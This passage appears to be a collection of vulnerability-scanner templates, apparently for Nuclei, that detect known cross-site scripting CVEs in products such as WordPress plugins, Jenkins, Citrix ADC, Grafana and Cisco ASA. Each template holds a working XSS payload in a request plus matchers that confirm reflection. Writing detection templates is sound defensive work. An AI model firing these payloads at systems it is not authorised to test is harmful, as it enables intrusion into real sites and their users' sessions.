- severity - medium
- tags - packetstorm,cve,cve2013,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3Cscript%3Ealert(1)%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \<script>alert(1)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Jeedom \<=4.0.38 - Cross-Site Scripting
## Description
- Jeedom through 4.0.38 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
- severity - medium
- tags - cve,cve2020,xss,jeedom
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?v=d&p=%22;alert(document.domain);%22
### Matchers

**Type - word**
- words
    1. \<script>document.title = "";alert(document.domain);" - Jeedom"\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Jenkin Audit Trail \<=3.2 - Cross-Site Scripting
## Description
- Jenkins Audit Trail 3.2 and earlier does not escape the error message for the URL Patterns field form validation, resulting in a reflected cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2020,jenkins,xss,plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
- {{BaseURL}}/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
### Matchers

**Type - word**
- words
    1. \<h1>sample
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Nova Lite \< 1.3.9 - Cross-Site Scripting
## Description
- Nova Lite before 1.3.9 for WordPress is susceptible to reflected cross-site scripting via search.php.
- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,cve,cve2020,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. nova-lite
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.13.0 - Cross-Site Scripting
## Description
- DomainMOD 4.13.0 is vulnerable to cross-site scripting via reporting/domains/cost-by-owner.php in the "or Expiring Between" parameter.

- severity - medium
- tags - cve,cve2020,domainmod,xss,authenticated
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /reporting/domains/cost-by-owner.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

daterange=%22%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_2 == 200
    2. contains(all_headers_2, "text/html")
    3. contains(body_2, "value=\"\"/>\<script>alert(document.domain)\</script>")
    4. contains(body_2, "DomainMOD")
- condition - and

---
# twitter-server Cross-Site Scripting
## Description
- twitter-server before 20.12.0 is vulnerable to cross-site scripting in some configurations. The vulnerability exists in the administration panel of twitter-server in the histograms component via server/handler/HistogramQueryHandler.scala.

- severity - medium
- tags - cve,cve2020,xss,twitter-server
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/histograms?h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&fmt=plot_cdf&log_scale=true
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Citrix ADC/Gateway - Cross-Site Scripting
## Description
- Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 contain a cross-site scripting vulnerability due to improper input validation.

- severity - medium
- tags - cve,cve2020,citrix,xss
## Requests
### Step - 1
```
POST /menu/stapp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
X-NITRO-USER: xpyZxwy6

sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot

```
### Matchers

**Type - word**
- words
    1. \</title>\<script>alert(31337)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# WordPress Catch Breadcrumb \<1.5.4 - Cross-Site Scripting
## Description
- WordPress Catch Breadcrumb plugin before 1.5.4 contains a reflected cross-site scripting vulnerability via the s parameter (a search query). Also affected are 16 themes if the plugin is enabled: Alchemist and Alchemist PRO, Izabel and Izabel PRO, Chique and Chique PRO, Clean Enterprise and Clean Enterprise PRO, Bold Photography PRO, Intuitive PRO, Devotepress PRO, Clean Blocks PRO, Foodoholic PRO, Catch Mag PRO, Catch Wedding PRO, and Higher Education PRO.

- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,cve,cve2020
## Requests
- Method - GET
### URL
- {{BaseURL}}/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E
### Matchers

**Type - word**
- words
    1. \<img src=x onerror=alert(123);>
    2. catch-breadcrumb
- part - body
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# McAfee ePolicy Orchestrator \<5.10.9 Update 9 - Cross-Site Scripting
## Description
- McAfee ePolicy Orchestrator before 5.10.9 Update 9 is vulnerable to a cross-site scripting vulnerability that allows administrators to inject arbitrary web script or HTML via multiple parameters where the administrator's entries were not correctly sanitized.
reference:
- https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/
- https://kc.mcafee.com/corporate/index?page=content&id=SB10332
- https://nvd.nist.gov/vuln/detail/CVE-2020-7318

- severity - medium
- tags - cve,cve2020,xss,mcafee
## Requests
### Step - 1
```
GET /PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E HTTP/1.1
Host: {{Hostname}}
Connection: close

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

**Type - word**
- words
    1. Policy Name
    2. '">\<svg/onload=alert(document.domain)>
- condition - and
- part - body

---
# HashiCorp Consul/Consul Enterprise \<=1.9.4 - Cross-Site Scripting
## Description
- HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable to cross-site scripting via the key-value (KV) raw mode.

- severity - medium
- tags - cve,cve2020,consul,xss
## Requests
### Step - 1
```
PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
Host: {{Hostname}}

<!DOCTYPE html><script>alert(document.domain)</script>

```
### Step - 2
```
GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body_2
- words
    1. \<!DOCTYPE html>\<script>alert(document.domain)\</script>

---
# PHPGurukul Hospital Management System - Cross-Site Scripting
## Description
- PHPGurukul Hospital Management System in PHP 4.0 contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.

- severity - medium
- tags - cve2020,hms,cms,xss,authenticated,edb,cve
## Requests
### Step - 1
```
POST /hospital/hms/admin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&submit=&submit=

```
### Step - 2
```
POST /hospital/hms/admin/doctor-specilization.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3Ctd%3E&submit=

```
### Matchers

**Type - word**
- part - body
- words
    1. \<td class="hidden-xs">\</td>\<script>alert(document.domain);\</script>\<td>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Apache OFBiz \<=16.11.07 - Cross-Site Scripting
## Description
- Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting because data sent with contentId to /control/stream is not sanitized.
- severity - medium
- tags - cve,cve2020,apache,xss,ofbiz
## Requests
- Method - GET
### URL
- {{BaseURL}}/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(/xss/)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Agentejo Cockpit 0.10.2 - Cross-Site Scripting
## Description
- Agentejo Cockpit 0.10.2 contains a reflected cross-site scripting vulnerability due to insufficient sanitization of the to parameter in the /auth/login route, which allows for injection of arbitrary JavaScript code into a web page's content.
- severity - medium
- tags - cve,cve2020,cockpit,agentejo,xss,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/auth/login?to=/92874%27;alert(document.domain)//280
### Matchers

**Type - word**
- part - body
- words
    1. redirectTo = '/92874';alert(document.domain)//280';

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cisco ASA/FTD Software - Cross-Site Scripting
## Description
- Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software are vulnerable to cross-site scripting and could allow an unauthenticated, remote attacker to conduct attacks against a user of the web services interface of an affected device. The vulnerabilities are due to insufficient validation of user-supplied input by the web services interface of an affected device. An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations. For more information, see the reference links.

- severity - medium
- tags - cve,cve2020,xss,cisco,kev
## Requests
### Step - 1
```
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E

```
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(/{{randstr}}/)>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# QCube Cross-Site-Scripting
## Description
- A reflected cross-site scripting vulnerability in qcubed (all versions including 3.1.1) in profile.php via the stQuery-parameter allows unauthenticated attackers to steal sessions of authenticated users.
- severity - medium
- tags - cve,cve2020,qcubed,xss,seclists
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/assets/_core/php/profile.php
- {{BaseURL}}/assets/php/profile.php
- {{BaseURL}}/vendor/qcubed/qcubed/assets/php/profile.php
  - intDatabaseIndex=1&StrReferrer=somethinxg&strProfileData=YToxOntpOjA7YTozOntzOjEyOiJvYmpCYWNrdHJhY2UiO2E6MTp7czo0OiJhcmdzIjthOjE6e2k6MDtzOjM6IlBXTiI7fX1zOjg6InN0clF1ZXJ5IjtzOjExMjoic2VsZWN0IHZlcnNpb24oKTsgc2VsZWN0IGNvbnZlcnRfZnJvbShkZWNvZGUoJCRQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDRLJCQsJCRiYXNlNjQkJCksJCR1dGYtOCQkKSI7czoxMToiZGJsVGltZUluZm8iO3M6MToiMSI7fX0K=
### Matchers

**Type - word**
- words
    1. \<script>alert('xss')\</script>
- part - body

**Type - word**
- words
    1. Content-Type: text/html
- part - header

---
# Jeesns 1.4.2 - Cross-Site Scripting
## Description
- Jeesns 1.4.2 is vulnerable to reflected cross-site scripting in the /newVersion component and allows attackers to execute arbitrary web scripts or HTML.
- severity - medium
- tags - cve,cve2020,jeesns,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Revive Adserver \<=5.0.3 - Cross-Site Scripting
## Description
- Revive Adserver 5.0.3 and prior contains a reflected cross-site scripting vulnerability in the publicly accessible afr.php delivery script. In older versions, it is possible to steal the session identifier and gain access to the admin interface. The query string sent to the www/delivery/afr.php script is printed back without proper escaping, allowing an attacker to execute arbitrary JavaScript code on the browser of the victim.

- severity - medium
- tags - cve,cve2020,xss,hackerone
## Requests
- Method - GET
### URL
- {{BaseURL}}/www/delivery/afr.php?refresh=10000&")',10000000);alert(1337);setTimeout('alert("
### Matchers

**Type - status**
- status
    1. 200

**Type - regex**
- part - body
- regex
    1. (?mi)window\.location\.replace\(".*alert\(1337\)

---
# Contentful \<=2020-05-21 - Cross-Site Scripting
## Description
- Contentful through 2020-05-21 for Python contains a reflected cross-site scripting vulnerability via the api parameter to the-example-app.py.

- severity - medium
- tags - cve,cve2020,contentful,xss
## Requests
### Step - 1
```
GET /?cda'"</script><script>alert(document.domain)</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- words
    1. {'api': '
    2. \</script>\<script>alert(document.domain)\</script>',
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Grafana \<=6.7.1 - Cross-Site Scripting
## Description
- Grafana through 6.7.1 contains an unauthenticated stored cross-site scripting vulnerability due to insufficient input protection in the originalUrl field, which allows an attacker to inject JavaScript code that will be executed after clicking on Open Original Dashboard after visiting the snapshot.
- severity - medium
- tags - cve,cve2020,xss,grafana
## Requests
### Step - 1
```
POST /api/snapshots HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: {{BaseURL}}
content-type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. application/json

**Type - word**
- part - body
- words
    1. "deleteKey":
    2. "deleteUrl":
- condition - and
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. "url":"([a-z:/0-9A-Z]+)"

---
# NeDi 1.9C - Cross-Site Scripting
## Description
- NeDi 1.9C is vulnerable to cross-site scripting because of an incorrect implementation of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT tag from user-controllable values, but can be easily bypassed, as demonstrated by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.
- severity - medium
- tags - cve,cve2020,nedi,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
### Matchers

**Type - word**
- words
    1. \<img src=x onerror=alert(document.domain)>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Jeesns 1.4.2 - Cross-Site Scripting
## Description
- Jeesns 1.4.2 is vulnerable to reflected cross-site scripting in the /weibo/topic component and allows attackers to execute arbitrary web scripts or HTML via a crafted payload in the system error message's text field.
- severity - medium
- tags - cve,cve2020,jeesns,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Jenkins Gitlab Hook \<=1.4.2 - Cross-Site Scripting
## Description
- Jenkins Gitlab Hook 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected cross-site scripting vulnerability.
- severity - medium
- tags - jenkins,xss,gitlab,plugin,packetstorm,cve,cve2020
## Requests
- Method - GET
### URL
- {{BaseURL}}/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

---
# Bitrix24 \<=20.0.0 - Cross-Site Scripting
## Description
- The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows XSS via the items[ITEMS][ID] parameter to the components/bitrix/mobileapp.list/ajax.php/ URI.
- severity - medium
- tags - cve,cve2020,xss,bitrix
## Requests
- Method - GET
### URL
- {{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=\<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>
- {{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.domain)%3B%7D%3B//%3C/div%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<a href="/*">*/)});function __MobileAppList(){alert(1)}//
    2. function(handler){};function __MobileAppList(test){alert(document.domain);};//\</div>
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# shadoweb wdja v1.5.1 - Cross-Site Scripting
## Description
- shadoweb wdja v1.5.1 is susceptible to cross-site scripting because it allows attackers to execute arbitrary code and gain escalated privileges via the backurl parameter to /php/passport/index.php.
- severity - critical
- tags - cve,cve2020,xss,wdja,shadoweb
## Requests
- Method - GET
### URL
- {{BaseURL}}/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- condition - and
- words
    1. location.href='\</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CLink Office 2.0 - Cross-Site Scripting
## Description
- CLink Office 2.0 is vulnerable to cross-site scripting in the index page of the management console and allows remote attackers to inject arbitrary web script or HTML via the lang parameter.

- severity - medium
- tags - cve,cve2020,xss,clink-office
## Requests
- Method - GET
### URL
- {{BaseURL}}?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
### Matchers

**Type - word**
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# PacsOne Server \<7.1.1 - Cross-Site Scripting
## Description
- PacsOne Server (PACS Server In One Box) below 7.1.1 is vulnerable to cross-site scripting.
- severity - medium
- tags - pacsone,xss,cve,cve2020
## Requests
- Method - GET
### URL
- {{BaseURL}}/pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E
### Matchers

**Type - word**
- words
    1. text/html
- part - header

**Type - word**
- words
    1. \<img src="" onerror="alert(1);">1\</img>
- part - body

**Type - status**
- status
    1. 200

---
# TileServer GL \<=3.0.0 - Cross-Site Scripting
## Description
- TileServer GL through 3.0.0 is vulnerable to reflected cross-site scripting via server.js  because the content of the key GET parameter is reflected unsanitized in an HTTP response for the application's main page.
- severity - medium
- tags - cve,cve2020,xss,tileserver,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. '>"\<svg/onload=confirm('xss')>
- part - body

---
# WordPress GTranslate \<2.8.52 - Cross-Site Scripting
## Description
- WordPress GTranslate plugin before 2.8.52 contains an unauthenticated reflected cross-site scripting vulnerability via a crafted link. This requires use of the hreflang tags feature within a sub-domain or sub-directory paid option.

- severity - medium
- tags - cve,cve2020,wordpress,xss,plugin,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E\<img%20src=x
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert("XSS")\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# IceWarp WebMail 11.4.5.0 - Cross-Site Scripting
## Description
- IceWarp WebMail 11.4.5.0 is vulnerable to cross-site scripting via the language parameter.
- severity - medium
- tags - xss,icewarp,packetstorm,cve,cve2020
## Requests
- Method - GET
### URL
- {{BaseURL}}/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<img src=x onerror=alert(1)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# ZZcms - Cross-Site Scripting
## Description
- ZZcms 2019 contains a cross-site scripting vulnerability in the user login page. An attacker can inject arbitrary JavaScript code in the referer header via user/login.php, which can allow theft of cookie-based credentials and launch of subsequent attacks.

- severity - medium
- tags - cve,cve2020,zzcms,xss
## Requests
### Step - 1
```
GET /user/login.php HTTP/1.1
Host: {{Hostname}}
Referer: xss"/><img src="#" onerror="alert(document.domain)"/>

```
### Matchers

**Type - word**
- part - body
- words
    1. fromurl" type="hidden" value="xss"/>\<img src="#" onerror="alert(document.domain)"/>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Jira Subversion ALM for Enterprise \<8.8.2 - Cross-Site Scripting
## Description
- Jira Subversion ALM for Enterprise before 8.8.2 contains a cross-site scripting vulnerability at multiple locations.
- severity - medium
- tags - cve,cve2020,atlassian,jira,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
- {{BaseURL}}/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS
- {{BaseURL}}/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
- {{BaseURL}}/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test
- {{BaseURL}}/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# Extreme Management Center 8.4.1.24 - Cross-Site Scripting
## Description
- Extreme Management Center 8.4.1.24 contains a cross-site scripting vulnerability via a parameter in a GET request. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2020,xss,extremenetworks
## Requests
- Method - GET
### URL
- {{BaseURL}}/OneView/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)
### Matchers

**Type - word**
- part - body
- words
    1. autofocus onfocus='alert(document.domain)
    2. Extreme Management Center
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WSO2 Carbon Management Console \<=5.10 - Cross-Site Scripting
## Description
- WSO2 Management Console through 5.10 is susceptible to reflected cross-site scripting which can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.
- severity - medium
- tags - xss,wso2,cve2020,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/carbon/admin/login.jsp?msgId=%27%3Balert(%27nuclei%27)%2F%2F
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. '';alert('nuclei')//';
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Event Espresso Core-Reg 4.10.7.p - Cross-Site Scripting
## Description
- Event Espresso Core-Reg 4.10.7.p is vulnerable to cross-site scripting in wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php and allows remote attackers to inject arbitrary web script or HTML via the page parameter.

- severity - medium
- tags - cve,cve2020,xss,wordpress,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb
### Matchers

**Type - word**
- words
    1. "/>\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 500

**Type - word**
- part - header
- words
    1. text/html

---
# Mitel ShoreTel 19.46.1802.0 Devices - Cross-Site Scripting
## Description
- Mitel ShoreTel 19.46.1802.0 devices and their conference component are vulnerable to an unauthenticated attacker conducting reflected cross-site scripting attacks via the PATH_INFO variable to index.php due to insufficient validation for the time_zone object in the HOME_MEETING& page.
- severity - medium
- tags - packetstorm,cve,cve2020,shoretel,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. Content-Type: text/html
- part - header

**Type - status**
- status
    1. 200

---
# Mara CMS  7.5 - Cross-Site Scripting
## Description
- Mara CMS 7.5 allows reflected cross-site scripting in contact.php via the theme or pagetheme parameters.
- severity - medium
- tags - cve,cve2020,mara,xss,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Quixplorer \<=2.4.1 - Cross Site Scripting
## Description
- Quixplorer \<=2.4.1 is vulnerable to reflected cross-site scripting (XSS) caused by improper validation of user supplied input. A remote attacker could exploit this vulnerability using a specially crafted URL to execute a script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.

- severity - medium
- tags - cve,cve2020,quixplorer,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?action=post&order=bszop%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>&srt=yes
    2. My Download
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress 15Zine \<3.3.0 - Cross-Site Scripting
## Description
- WordPress 15Zine before 3.3.0 is vulnerable to reflected cross-site scripting because the theme does not sanitize the cbi parameter before including it in the HTTP response via the cb_s_a AJAX action.

- severity - medium
- tags - xss,wordpress,wp-theme,wp,cve,cve2020,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=cb_s_a&cbi=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Wing FTP 6.4.4 - Cross-Site Scripting
## Description
- Wing FTP 6.4.4 is vulnerable to cross-site scripting via its web interface because an arbitrary IFRAME element can be included in the help pages via a crafted link, leading to the execution of (sandboxed) arbitrary HTML and JavaScript in the user's browser.

- severity - medium
- tags - cve,cve2020,xss,wing-ftp
## Requests
- Method - GET
### URL
- {{BaseURL}}/help/english/index.html?javascript:alert(document.domain)
### Matchers

**Type - word**
- words
    1. \<frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Xinuo Openserver 5/6 - Cross-Site scripting
## Description
- Xinuo (formerly SCO) Openserver versions 5 and 6 allows remote attackers to inject arbitrary web script or HTML tag via the parameter 'section' and is vulnerable to reflected cross-site scripting.
- severity - medium
- tags - cve,cve2020,sco,xss,edb,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/{{randstr}}/)%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<h1>hello\</h1>\<script>alert(/{{randstr}}/)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Aryanic HighMail (High CMS) - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in Aryanic HighMail (High CMS) versions 2020 and before allows remote attackers to inject arbitrary web script or HTML, via 'user' to LoginForm.
- severity - medium
- tags - cve,cve2020,xss,cms,highmail,aryanic
## Requests
- Method - GET
### URL
